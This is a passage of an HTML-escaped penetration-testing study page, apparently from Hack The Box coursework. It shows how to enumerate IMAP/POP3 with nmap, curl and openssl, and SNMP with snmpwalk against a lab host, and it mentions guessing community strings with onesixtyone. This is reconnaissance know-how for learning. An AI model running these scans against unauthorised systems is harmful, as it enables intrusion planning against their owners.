      &lt;td&gt;This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;footprinting-the-service&quot;&gt;Footprinting the Service&lt;/h2&gt;

&lt;p&gt;By default, ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;110&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;995&lt;/code&gt; are used for POP3, and ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;143&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;993&lt;/code&gt; are used for IMAP. The higher ports (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;993&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;995&lt;/code&gt;) use TLS/SSL to encrypt the communication between the client and server. Using Nmap, we can scan the server for these ports. The scan will return the corresponding information (as seen below) if the server uses an embedded certificate.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap 10.129.14.128 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p110&lt;/span&gt;,143,993,995 &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt;

Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-19 22:09 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.14.128
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mail1.inlanefreight.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Inlanefreight/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;California/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mail1.inlanefreight.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Inlanefreight/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;California/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login &lt;span class=&quot;nv&quot;&gt;AUTH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mail1.inlanefreight.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Inlanefreight/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;California/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE USER SASL&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PLAIN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mail1.inlanefreight.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Inlanefreight/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;California/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
MAC Address: 00:00:00:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;12.74 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;curl&quot;&gt;cURL&lt;/h4&gt;

&lt;p&gt;IMAP / POP3&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;imaps://10.129.14.128&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; user:p4ssw0rd

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; LIST &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;asNoChildren&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt; Important
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; LIST &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;asNoChildren&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt; INBOX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;openssl---tls-encrypted-interaction-pop3&quot;&gt;OpenSSL - TLS Encrypted Interaction POP3&lt;/h4&gt;

&lt;p&gt;IMAP / POP3&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl s_client &lt;span class=&quot;nt&quot;&gt;-connect&lt;/span&gt; 10.129.14.128:pop3s

CONNECTED&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;00000003&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Can&lt;span class=&quot;s1&quot;&gt;&apos;t use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;openssl---tls-encrypted-interaction-imap&quot;&gt;OpenSSL - TLS Encrypted Interaction IMAP&lt;/h4&gt;

&lt;p&gt;IMAP / POP3&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl s_client &lt;span class=&quot;nt&quot;&gt;-connect&lt;/span&gt; 10.129.14.128:imaps

CONNECTED&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;00000003&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Can&lt;span class=&quot;s1&quot;&gt;&apos;t use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP..
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;snmp-1&quot;&gt;SNMP&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Simple Network Management Protocol&lt;/code&gt; (&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1157&quot;&gt;SNMP&lt;/a&gt;) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SNMPv3&lt;/code&gt;, which increases the security of SNMP in particular, but also the complexity of using this protocol.&lt;/p&gt;

&lt;p&gt;In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;161&lt;/code&gt;. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traps&lt;/code&gt; over UDP port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;162&lt;/code&gt;. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.&lt;/p&gt;

&lt;p&gt;For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.&lt;/p&gt;

&lt;h4 id=&quot;mib&quot;&gt;MIB&lt;/h4&gt;

&lt;p&gt;To ensure that SNMP access works across manufacturers and with different client-server combinations, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Management Information Base&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MIB&lt;/code&gt;) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object Identifier&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OID&lt;/code&gt;), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Abstract Syntax Notation One&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASN.1&lt;/code&gt;) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.&lt;/p&gt;

&lt;h4 id=&quot;oid&quot;&gt;OID&lt;/h4&gt;

&lt;p&gt;An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node’s position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the &lt;a href=&quot;https://www.alvestrand.no/objectid/&quot;&gt;Object Identifier Registry&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;snmpv1&quot;&gt;SNMPv1&lt;/h4&gt;

&lt;p&gt;SNMP version 1 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SNMPv1&lt;/code&gt;) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no built-in authentication&lt;/code&gt; mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;does not support encryption&lt;/code&gt;, meaning that all data is sent in plain text and can be easily intercepted.&lt;/p&gt;

&lt;h4 id=&quot;snmpv2&quot;&gt;SNMPv2&lt;/h4&gt;

&lt;p&gt;SNMPv2 existed in different versions. The version still exists today is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v2c&lt;/code&gt;, and the extension &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;community string&lt;/code&gt; that provides security is only transmitted in plain text, meaning it has no built-in encryption.&lt;/p&gt;

&lt;h4 id=&quot;snmpv3&quot;&gt;SNMPv3&lt;/h4&gt;

&lt;p&gt;The security has been increased enormously for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SNMPv3&lt;/code&gt; by security features such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authentication&lt;/code&gt; using username and password and transmission &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encryption&lt;/code&gt; (via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pre-shared key&lt;/code&gt;) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v2c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;#snmpwalk&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snmpwalk &lt;span class=&quot;nt&quot;&gt;-v2c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.129.14.128

iso.3.6.1.2.1.1.1.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.2.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5134&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:51.34
iso.3.6.1.2.1.1.4.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;mrb3n@inlanefreight.htb&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.5.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;htb&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.6.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;Sitting on the Dock of the Bay&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.7.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: 72
iso.3.6.1.2.1.1.8.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The SNMP Management Architecture MIB.&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The MIB for Message Processing and Dispatching.&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The management information definitions for the SNMP User-based Security Model.&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The MIB module for SNMPv2 entities&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;View-based Access Control Model for SNMP.&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The MIB module for managing TCP implementations&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.7 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The MIB module for managing IP and ICMP implementations&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The MIB module for managing UDP implementations&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.9 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The MIB modules for managing SNMP Notification, plus filtering.&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.3.10 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;The MIB module for logging SNMP Notifications.&quot;&lt;/span&gt;
iso.3.6.1.2.1.1.9.1.4.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Timeticks: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3676678&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 10:12:46.78
iso.3.6.1.2.1.25.1.2.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Hex-STRING: 07 E5 09 14 0E 2B 2D 00 2B 02 00 
iso.3.6.1.2.1.25.1.3.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-f92a-42ea-8ddf-940d7e0f4223 ro quiet splash&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.1.5.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Gauge32: 3
iso.3.6.1.2.1.25.1.6.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Gauge32: 411
iso.3.6.1.2.1.25.1.7.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; No more variables left &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this MIB View &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;It is past the end of the MIB tree&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

...SNIP...

iso.3.6.1.2.1.25.6.3.1.2.1232 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;printer-driver-sag-gdi_0.1-7_all&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1233 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1234 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;procps_2:3.3.16-1ubuntu2.3_amd64&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1235 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;proftpd-basic_1.3.6c-2_amd64&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1236 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;proftpd-doc_1.3.6c-2_all&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1237 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;psmisc_23.3-1_amd64&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1238 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;publicsuffix_20200303.0012-1_all&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1239 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;pulseaudio_1:13.99.1-1ubuntu3.12_amd64&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1240 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;pulseaudio-module-bluetooth_1:13.99.1-1ubuntu3.12_amd64&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1241 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;pulseaudio-utils_1:13.99.1-1ubuntu3.12_amd64&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1242 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;python-apt-common_2.0.0ubuntu0.20.04.6_all&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1243 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;python3_3.8.2-0ubuntu2_amd64&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1244 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;python3-acme_1.1.0-1_all&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1245 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;python3-apport_2.20.11-0ubuntu27.21_all&quot;&lt;/span&gt;
iso.3.6.1.2.1.25.6.3.1.2.1246 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;python3-apt_2.0.0ubuntu0.20.04.6_amd64&quot;&lt;/span&gt; 

...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onesixtyone&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SecLists&lt;/code&gt; wordlists to identify these community strings.&lt;/p&gt;

